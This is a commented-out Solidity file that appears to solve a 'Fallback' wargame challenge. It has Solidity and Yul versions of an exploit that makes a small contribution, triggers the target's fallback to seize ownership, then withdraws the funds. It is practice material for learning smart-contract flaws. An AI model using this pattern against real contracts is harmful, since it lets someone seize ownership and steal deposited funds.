// // SPDX-License-Identifier: UNLICENSED
// pragma solidity ^0.8.18;

// interface Fallback {
//     function owner() external view returns (address);

//     function contribute() external payable;

//     function withdraw() external;
// }

// contract FallbackHack {
//     Fallback _fallback;

//     constructor(address chal) {
//         _fallback = Fallback(chal);
//     }

//     function SolidityHack() public {
//         _fallback.contribute{value: 1}();
//         (bool success, ) = address(_fallback).call{value: 1}("");
//         _fallback.withdraw();
//     }

//     function YulHack() public {
//         assembly {
//             let _fallbackInstance := sload(_fallback.slot)

//             mstore(0, "contribute()")
//             mstore(0, keccak256(0, 12))
//             let success := call(gas(), _fallbackInstance, 1, 0, 4, 0, 0)
//             if iszero(success) {
//                 revert(0, 0)
//             }

//             success := call(gas(), _fallbackInstance, 1, 0, 0, 0, 0)
//             if iszero(success) {
//                 revert(0, 0)
//             }

//             mstore(0, "withdraw()")
//             mstore(0, keccak256(0, 10))
//             success := call(gas(), _fallbackInstance, 0, 0, 4, 0, 0)
//             if iszero(success) {
//                 revert(0, 0)
//             }
//         }
//     }
// }
